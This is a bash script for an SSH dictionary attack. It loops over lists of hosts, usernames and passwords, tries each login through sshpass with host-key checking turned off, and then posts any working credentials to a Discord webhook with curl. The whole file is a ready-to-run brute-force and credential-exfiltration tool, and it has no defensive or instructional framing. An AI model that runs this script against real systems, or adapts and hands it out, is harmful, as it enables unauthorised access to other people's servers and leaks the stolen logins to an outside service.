#!/bin/bash

# Discord webhook url for notifications
WEBHOOK_URL="<YOUR-OWN-DISCORD-WEBHOOK-URL>"
TIMEOUT="5" # ssh connection timeout
PORT="22" # ssh port designation

# Files for script use
host_file="./hosts.txt"
user_file="./usernames.txt"
pass_file="./passwords.txt"

declare -a host_list
declare -a user_list
declare -a pass_list

# Create a list of ip addresses from the "${host_file}"
addresses() {
    local count=0
    while IFS= read -r address; do
        host_list[$count]="${address}"
        (( count++ ))
    done < "${host_file}"
}

# Create a list of usernames from the "${user_file}"
usernames() {
    local count=0
    while IFS= read -r user; do
        user_list[$count]="${user}"
        (( count++ ))
    done < "${user_file}"
}

# Create a list of passwords from the "${pass_file}"
passwords() {
    local count=0
    while IFS= read -r pass; do
        pass_list[$count]="${pass}"
        (( count++ ))
    done < "${pass_file}"
}

# Get the difference in time from the start and end of the script
get_time() {
    local stime="${1}"
    local etime="${2}"

    stime=$(date --date="${stime}" +%s)
    etime=$(date --date="${etime}" +%s)

    local dif_time=$(( etime - stime ))
    local second=0
    local minute=0
    local hour=0

    # Loop through the seconds of time and subtract 60 seconds until unable while adding minutes and hours
    # Very crude but works
    local value=1
    while (( value == 1 )); do
        if (( dif_time >= 60 )); then
            dif_time=$(( dif_time - 60 ))
            (( minute++ ))
        else
            second=${dif_time}
            value=0
        fi
        if (( minute == 60 )); then
            (( hour++ ))
            minute=0
        fi
    done

    echo
    echo -e "\tTotal Script Time:"
    echo -e "\tHours:   ${hour}"
    echo -e "\tMinutes: ${minute}"
    echo -e "\tSeconds: ${second}"
}

# Send message of the found credentials to the Discord webhook
notify() {
    local user="${1}"
    local pass="${2}"
    local host="${3}"

    local message=$(cat <<EOF

Credentials found!
Host: ${host}
Username: ${user}
Password: ${pass}
Timestamp: $(date -u)

EOF
)

    curl -H "Content-Type: application/json" \
         -X POST \
         -d "$(jq -n --arg msg "${message}" '{content: $msg}')" \
         "${WEBHOOK_URL}"
}

# Request connection over ssh from the inputs
ssh_function() {
    local user="${1}"
    local pass="${2}"
    local host="${3}"

    sshpass -p "${pass}" ssh \
        -o "ConnectTimeout=${TIMEOUT}" \
        -o "StrictHostKeyChecking=no" \
        -p "${PORT}" "${user}@${host}" \
        exit >/dev/null 2>&1
}


main() {
    # Counts how many times the hosts were attempted to connect
    local host_iter=1

    # Loops through usernames
    for user in ${user_list[@]}; do
        # Loops through passwords
        for pass in ${pass_list[@]}; do
            echo
            echo -e "\t[*] Attempting Username: '${user}' Password: '${pass}'"
            echo
            echo -e "\t[${host_iter}] Host Iteration..."
            # Loops through ip addresses
            for host in ${host_list[@]}; do
                echo -e "\t[*] Attempting Host: '${host}'"
                # Calls ssh_function, if it returns a connection then....
                # Display credentials and send notification
                if ssh_function "${user}" "${pass}" "${host}"; then
                    echo -e "\t[+] Successful login!"
                    echo -e "\t[+] Host: ${host}"
                    echo -e "\t[+] Username: '${user}'"
                    echo -e "\t[+] Password: '${pass}'"
                    if notify "${user}" "${pass}" "${host}"; then
                        echo
                        echo "Notification sent to Discord."
                    else
                        echo
                        echo "Was not able to send notification."
                    fi
                    # Exit script once a credential is found
                    exit 0
                fi
                # Wait 0.2 seconds between each ssh attempt
                sleep 0.2

            done
            (( host_iter++ ))

        done

    done

    echo -e "\n\tNo valid credentionals found."
}


echo -e "\n\tSSH Dictionary Attack Script Starting."

# Initialize the lists
addresses
usernames
passwords

echo
start_time=$(date -u)
echo -e "\t[+] Start Time: ${start_time}"

# Call main function
main

echo
end_time=$(date -u)
echo -e "\t[-] End Time: ${end_time}"

get_time "${start_time}" "${end_time}"

echo -e "\n\tSSH Dictionary Attack Script Complete.\n"
